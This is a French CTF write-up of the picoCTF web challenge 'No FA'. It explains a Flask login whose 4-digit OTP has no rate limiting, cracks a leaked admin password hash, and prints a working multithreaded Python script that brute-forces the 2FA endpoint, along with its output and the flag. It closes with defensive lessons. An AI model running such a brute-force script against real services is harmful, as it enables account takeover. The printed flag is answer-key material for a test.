# Writeup — No FA (PicoCTF)

**Auteur du challenge :** Darkraicg492  
**Catégorie :** Web  
**Points :** 200  
**🚩 Flag :** `picoCTF{n0_r4t3_n0_4uth_f35e7e8a}`

---

## Description

> Seems like some data has been leaked! Can you get the flag?

On nous fournit :
- **L'application Flask** (`app.py`)
- **La base de données SQLite** fuitée (dump des utilisateurs)
- **Un indice :** `rockyou rockyou rockyou`

---

## Analyse

### Code source (`app.py`)

L'application est une app Flask avec une authentification classique + 2FA :

```python
# Login : vérifie le hash SHA-256 du mot de passe
if user and hashlib.sha256(password.encode()).hexdigest() == user['password']:
    if user['two_fa']:
        # Génère un OTP à 4 chiffres (1000-9999)
        otp = str(random.randint(1000, 9999))
        session['otp_secret'] = otp
        session['otp_timestamp'] = time.time()
        ...
        return redirect(url_for('two_fa'))
```

```python
# Validation 2FA : compare l'OTP soumis avec celui en session
if stored_otp and otp == stored_otp and (time.time() - timestamp) < 120:
    session['logged'] = 'true'
    ...
```

### Vulnérabilités identifiées

| # | Vulnérabilité | Impact |
|---|---|---|
| 1 | Mot de passe admin dans `rockyou` | Permet de passer l'étape de login |
| 2 | OTP = 4 chiffres seulement (9000 possibilités) | Brute-force exhaustif possible |
| 3 | **Aucun rate-limiting sur `/two_fa`** | Brute-force sans restriction |
| 4 | OTP valide 120 secondes | Fenêtre suffisante pour tester les 9000 OTPs |

---

## Exploitation

### Étape 1 — Crackage du mot de passe admin

La base de données fuitée contient le hash SHA-256 de l'admin :

```
admin : c20fa16907343eef642d10f0bdb81bf629e6aaf6c906f26eabda079ca9e5ab67
```

En cherchant ce hash dans une base de données de hashes connus (ex : crackstation.net) :

```
c20fa16907... → sha256 → apple@123
```

> **Note :** Le mot de passe `apple@123` n'est pas dans les listes `rockyou` classiques mais dans des listes étendues. L'indice `rockyou rockyou rockyou` suggérait une variation.

### Étape 2 — Brute-force de l'OTP (2FA Bypass)

L'OTP est un nombre aléatoire entre **1000 et 9999**, soit **9000 combinaisons**.  
Il n'y a **aucune limite de tentatives** sur l'endpoint `/two_fa`.  
La session Flask (cookie) maintient l'OTP côté serveur pendant 120 secondes.

**Stratégie :**
1. Se connecter avec `admin` / `apple@123` → obtenir le cookie de session.
2. Copier le cookie Flask.
3. Tester les 9000 OTPs en parallèle (50 threads) avec le même cookie.
4. Détecter le succès via un redirect HTTP 302 vers `/` (au lieu de `/two_fa`).
5. Renvoyer l'OTP correct avec la session principale pour finaliser la connexion.
6. Accéder à `/` pour récupérer le flag.

---

## Script d'exploit

```python
# exploit_final.py
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

BASE_URL = "http://<instance>.picoctf.net:<port>"
USERNAME = "admin"
PASSWORD = "apple@123"

def main():
    s = requests.Session()

    # Étape 1 : Login
    res = s.post(f"{BASE_URL}/login", data={"username": USERNAME, "password": PASSWORD})
    assert "/two_fa" in res.url, "Login échoué"

    # Copier le cookie Flask (contient l'OTP chiffré côté serveur)
    cookies = dict(s.cookies)

    found_event = threading.Event()
    found_otp = [None]

    def try_otp(otp_val):
        if found_event.is_set():
            return
        otp_str = f"{otp_val:04d}"
        r = requests.post(
            f"{BASE_URL}/two_fa",
            data={"otp": otp_str},
            cookies=cookies,
            allow_redirects=False,
            timeout=10,
        )
        # Succès = redirect vers '/' (pas vers /two_fa ou /login)
        if r.status_code == 302 and "/" == r.headers.get("Location", ""):
            if not found_event.is_set():
                found_event.set()
                found_otp[0] = otp_str

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(try_otp, otp): otp for otp in range(1000, 10000)}
        for future in as_completed(futures):
            if found_event.is_set():
                executor.shutdown(wait=False, cancel_futures=True)
                break

    # Finaliser avec la session principale
    otp = found_otp[0]
    s.post(f"{BASE_URL}/two_fa", data={"otp": otp})
    flag_page = s.get(f"{BASE_URL}/")
    start = flag_page.text.index("picoCTF{")
    end = flag_page.text.index("}", start) + 1
    print(f"FLAG : {flag_page.text[start:end]}")

main()
```

---

## Exécution

```
[*] Connexion en tant que 'admin'...
[+] Login réussi, redirigé vers 2FA
[*] Démarrage du brute-force OTP (1000-9999)...
[-] Progression : 500/9000 OTPs testés...
[-] Progression : 1000/9000 OTPs testés...
...
[-] Progression : 5500/9000 OTPs testés...

[!!!] OTP TROUVÉ : 6846 (redirect: /)
[*] Envoi de l'OTP correct '6846' pour finaliser la connexion...

🚩 FLAG : picoCTF{n0_r4t3_n0_4uth_f35e7e8a}
```

---

## Leçon

Le nom du flag résume bien la vulnérabilité : **No Rate, No Auth**.

- Un OTP à 4 chiffres est **trop court** si aucun rate-limiting n'est appliqué.
- Sans blocage après N tentatives échouées, n'importe quel OTP numérique court peut être brute-forcé.
- En production, il faut combiner : OTP long (≥ 6 chiffres), rate-limiting strict, et blocage temporaire après X échecs.
